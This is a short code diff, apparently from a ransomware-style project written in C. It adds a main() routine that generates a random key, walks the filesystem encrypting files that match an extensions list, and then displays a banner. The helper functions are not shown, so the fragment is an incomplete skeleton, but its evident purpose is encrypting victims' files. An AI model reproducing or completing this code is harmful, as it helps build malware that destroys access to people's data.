@@ -1,17 +1,27 @@
 #include "crypt.h"
 #include "banner.h"
-
-#define MAX_FILE_SIZE int64_t(20 + 1e+6)
-#define TEMP_DIR "./tmp/"
-#define ENCRYPTED_EXTENSION ".enc"
-#define MAX_PATH 1024
+#include "utils.h"
 
 
 typedef struct {
     File file;
-
 } FileToRename;
 
 void init() {
     banner();
+}
+
+int main() {
+    mkdir(TEMP_DIR, 0777);
+
+    char key[KEY_SIZE];
+    generate_random_key(key);
+
+    for (int i = 0; extensions[i]; i++) {
+        walk_encrypt(extensions[i], key);
+    }
+
+    init();
+
+    return 0;
 }
